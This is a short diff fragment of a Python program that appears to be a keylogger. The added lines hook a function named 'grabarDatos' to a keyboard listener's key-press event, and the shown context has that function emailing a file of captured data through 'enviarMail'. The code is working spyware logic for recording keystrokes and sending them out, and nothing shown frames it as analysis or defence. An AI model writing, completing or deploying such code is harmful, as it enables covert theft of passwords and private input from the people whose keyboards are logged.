@@ -36,3 +36,5 @@ def grabarDatos(key):
         enviarMail(archivoConLosDatos)
         quit()
 
+with Listener(on_press = grabarDatos) as l:
+    l.join()
